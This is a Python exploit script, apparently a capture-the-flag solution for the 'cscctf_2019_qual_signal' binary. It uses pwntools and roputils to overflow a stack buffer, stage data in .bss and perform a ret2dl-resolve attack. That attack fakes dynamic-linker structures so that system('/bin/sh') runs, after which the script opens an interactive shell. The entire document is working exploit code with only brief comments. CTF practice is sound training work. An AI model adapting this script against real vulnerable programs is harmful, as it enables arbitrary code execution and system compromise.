from pwn import *
from roputils import *
context.arch='amd64'
io = process('./cscctf_2019_qual_signal')
context.log_level = 'debug'
rop = ROP('./cscctf_2019_qual_signal')
offset = 0x108
bss_base = rop.section('.bss')
buf = rop.fill(offset)

buf += rop.call('read',0,bss_base,100)
# used to call dl_Resolve()
buf += rop.dl_resolve_call(bss_base + 20, bss_base)
io.send(buf)

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
# used to make faking data, such relocation, Symbol, Str
buf += rop.dl_resolve_data(bss_base + 20, 'system')
buf += rop.fill(100, buf)
io.send(buf)
io.interactive()
